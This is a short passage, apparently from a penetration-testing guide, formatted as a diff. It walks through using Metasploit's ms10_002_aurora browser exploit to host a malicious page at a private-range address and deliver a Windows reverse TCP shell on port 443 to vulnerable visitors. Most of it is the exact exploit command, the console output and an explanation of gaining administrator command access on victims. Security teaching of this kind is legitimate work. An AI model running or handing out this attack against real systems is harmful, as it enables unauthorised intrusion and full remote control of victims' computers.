@@ -1,0 +1,31 @@
+After infect them with a malicious redirect.  We  will  use  the  Metasploit  framework
+in  order  to  quickly  create  a  malicious server and page hosted at http://10.10.10.112:8080/exploit. 
+
+
+attacker# msfcli exploit/windows/browser/ms10_002_aurora 
+LHOST=10.10.10.112 SRVHOST=10.10.10.112 URIPATH=/exploit 
+PAYLOAD=windows/shell/reverse_tcp LHOST=10.10.10.112 LPORT=443 E
+
+[*] Please wait while we load the module tree...
+
+<…SNIPPED…>
+
+LHOST => 10.10.10.112
+SRVHOST => 10.10.10.112
+URIPATH => /exploit
+PAYLOAD => windows/shell/reverse_tcp
+LHOST => 10.10.10.112
+LPORT => 443
+[*] Exploit running as background job.
+[*] Started reverse handler on 10.10.10.112:443
+[*] Using URL:http://10.10.10.112:8080/exploit
+[*] Server started.
+
+msf exploit(ms10_002_aurora) >
+
+
+Any vulnerable client that connects to our server at http://10.10.10.112:8080/
+exploitwill now fall prey to our exploit. If it succeeds, it will create a reverse 
+TCP  shell  and  grant  us  access  to  the  Windows  command  prompt  on  the infected 
+client. From the command shell, we can now execute commands as the administrator 
+of the infected victim.
